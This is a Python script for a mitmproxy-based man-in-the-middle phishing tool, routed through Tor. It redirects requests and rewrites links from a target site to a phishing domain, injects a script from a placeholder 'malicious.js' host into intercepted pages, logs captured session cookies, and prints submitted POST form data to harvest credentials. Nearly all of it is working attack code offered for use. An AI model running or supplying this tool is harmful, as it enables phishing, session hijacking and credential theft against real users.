python mitm_proxy_tool.py

import os
import subprocess
import sys
import pathlib
from mitmproxy import http
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin

# Configuration
PHISHING_TARGET = "targetsite.com"  # Replace with the real website
PHISHING_REDIRECT = "phishingsite.com"  # Your phishing simulation site
SOCKS5_PROXY = "http://127.0.0.1:9050"  # Tor SOCKS5 proxy (ensure Tor is running)

CERT_PATH = pathlib.Path("~/.mitmproxy/mitmproxy-ca-cert.pem").expanduser()

# Install all dependencies
def install_dependencies():
    """
    Install required Python packages and verify mitmproxy installation.
    """
    print("[+] Installing dependencies...")
    packages = ["mitmproxy", "beautifulsoup4"]

    for package in packages:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to install {package}: {e}")
            sys.exit(1)

    try:
        subprocess.run(["mitmproxy", "--version"], check=True)
        print("[+] mitmproxy installed and ready.")
    except FileNotFoundError:
        print("[!] mitmproxy is not installed. Install it manually and re-run this script.")
        sys.exit(1)

# Start mitmproxy with SOCKS5
def start_mitmproxy():
    """
    Starts mitmproxy in upstream proxy mode using SOCKS5.
    """
    print("[+] Launching mitmproxy with SOCKS5 proxy...")
    try:
        subprocess.run(
            ["mitmdump", "-s", os.path.abspath(__file__), "--mode", f"upstream:{SOCKS5_PROXY}"],
            check=True,
        )
    except Exception as e:
        print(f"[!] Failed to start mitmproxy: {e}")
        sys.exit(1)

# Ensure certificate is trusted
def ensure_certificate_trusted():
    """
    Generates and ensures the mitmproxy certificate is trusted.
    """
    if not CERT_PATH.exists():
        print("[!] MITM certificate not found. Generating...")
        subprocess.run(["mitmproxy", "--set", "confdir=~/.mitmproxy"], check=True)

    print(f"[+] MITM certificate located: {CERT_PATH}")
    print("[!] Import this certificate into your browser for HTTPS interception.")

# Intercept requests
def request(flow: http.HTTPFlow):
    """
    Handles HTTP/HTTPS requests intercepted by mitmproxy.
    """
    # Redirect requests from target site to phishing site
    if PHISHING_TARGET in flow.request.url:
        print(f"[!] Redirecting {flow.request.url} to phishing site...")
        flow.request.url = flow.request.url.replace(PHISHING_TARGET, PHISHING_REDIRECT)

    # Add custom tracking header
    flow.request.headers["X-Intercepted"] = "MITM Proxy Active"

# Intercept responses
def response(flow: http.HTTPFlow):
    """
    Handles HTTP/HTTPS responses intercepted by mitmproxy.
    """
    # Inject custom scripts or modify links for the target site
    if PHISHING_TARGET in flow.request.url:
        if "text/html" in flow.response.headers.get("Content-Type", ""):
            print("[+] Modifying response from target site...")
            soup = BeautifulSoup(flow.response.text, "html.parser")

            # Replace links to redirect to the phishing site
            for tag in soup.find_all("a", href=True):
                original_url = tag["href"]
                if PHISHING_TARGET in original_url:
                    tag["href"] = original_url.replace(PHISHING_TARGET, PHISHING_REDIRECT)

            # Inject a custom JavaScript file
            script = soup.new_tag("script", src="https://example.com/malicious.js")
            soup.body.append(script)

            flow.response.text = str(soup)

    # Capture session cookies
    cookies = flow.response.headers.get("Set-Cookie")
    if cookies:
        print(f"[!] Captured cookies: {cookies}")

# Capture credentials (example for POST forms)
def capture_credentials(flow: http.HTTPFlow):
    """
    Logs credentials submitted to the phishing site.
    """
    if PHISHING_REDIRECT in flow.request.url and flow.request.method == "POST":
        print("[!] Captured POST data:")
        print(flow.request.text)

# Main script logic
if __name__ == "__main__":
    print("[+] Starting Enhanced MITM Proxy...")

    # Install dependencies
    install_dependencies()

    # Ensure certificate is trusted
    ensure_certificate_trusted()

    # Start mitmproxy with upstream SOCKS5 proxy
    start_mitmproxy()

